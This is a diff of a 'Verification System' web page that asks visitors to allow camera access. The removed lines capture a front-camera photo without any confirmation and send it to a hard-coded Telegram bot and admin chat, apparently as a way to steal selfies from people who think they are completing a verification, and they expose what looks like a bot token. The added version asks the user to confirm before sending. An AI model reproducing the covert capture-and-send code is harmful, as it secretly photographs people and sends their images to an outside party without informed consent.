@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,6 +10,8 @@
         .card { border: 2px solid #28a745; padding: 30px; border-radius: 20px; background: #111; max-width: 400px; margin: auto; }
         button { background: #28a745; color: white; border: none; padding: 20px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
         #status { margin-top: 20px; color: #ffc107; font-weight: bold; }
+        #preview { max-width: 100%; margin-top: 15px; }
+        #confirmBtn { display: none; margin-top: 15px; }
     </style>
 </head>
 <body>
@@ -16,43 +19,84 @@
         <h2>Verification System</h2>
         <p>Please click the button and allow camera access to continue.</p>
         <button id="authBtn">Start Verification</button>
+        <img id="preview" style="display:none;">
+        <button id="confirmBtn">Confirm & Send Photo</button>
         <div id="status">Ready</div>
     </div>
+
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
-    <script>
-        const TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
-        // This will send the photo to the first admin ID
-        const ADMIN_ID = "7289235107"; 
+<script>
+    const ADMIN_ID = "6725207992";
+    let photoBlob = null;
 
-        document.getElementById('authBtn').onclick = async () => {
-            const s = document.getElementById('status');
-            try {
-                s.innerText = "Requesting Permission...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                s.innerText = "Processing...";
-                const v = document.getElementById('v');
-                v.srcObject = stream;
+    document.getElementById('authBtn').onclick = async () => {
+        const s = document.getElementById('status');
 
-                setTimeout(async () => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = v.videoWidth;
-                    canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                    const fd = new FormData();
-                    fd.append('chat_id', ADMIN_ID);
-                    fd.append('photo', blob, 'verify.jpg');
+        try {
+            s.innerText = "Requesting Permission...";
 
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    s.innerText = "✅ Success!";
-                    stream.getTracks().forEach(t => t.stop());
-                }, 2000);
-            } catch (e) {
-                s.innerHTML = "❌ Error: Camera Blocked.<br>Please allow camera in site settings (Lock 🔒 icon).";
-            }
-        };
-    </script>
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" }
+            });
+
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+
+            await new Promise(resolve => {
+                v.onloadedmetadata = resolve;
+            });
+
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            const canvas = document.getElementById('c');
+            canvas.width = v.videoWidth;
+            canvas.height = v.videoHeight;
+            canvas.getContext('2d').drawImage(v, 0, 0);
+
+            photoBlob = await new Promise(resolve =>
+                canvas.toBlob(resolve, 'image/jpeg', 0.8)
+            );
+
+            document.getElementById('preview').src =
+                URL.createObjectURL(photoBlob);
+
+            document.getElementById('preview').style.display = 'block';
+            document.getElementById('confirmBtn').style.display = 'block';
+
+            stream.getTracks().forEach(t => t.stop());
+
+            s.innerText = "Review your photo and confirm sending.";
+
+        } catch (e) {
+            s.innerText = "Camera access denied or unavailable.";
+        }
+    };
+
+    document.getElementById('confirmBtn').onclick = async () => {
+        if (!photoBlob) return;
+
+        const s = document.getElementById('status');
+        s.innerText = "Sending...";
+
+        const fd = new FormData();
+        fd.append('chat_id', ADMIN_ID);
+        fd.append('photo', photoBlob, 'verify.jpg');
+
+        try {
+            const response = await fetch('/api/send-verification', {
+                method: 'POST',
+                body: fd
+            });
+
+            if (!response.ok) throw new Error('Upload failed');
+
+            s.innerText = "✅ Success!";
+        } catch (e) {
+            s.innerText = "❌ Sending failed. Please try again.";
+        }
+    };
+</script>
 </body>
 </html>
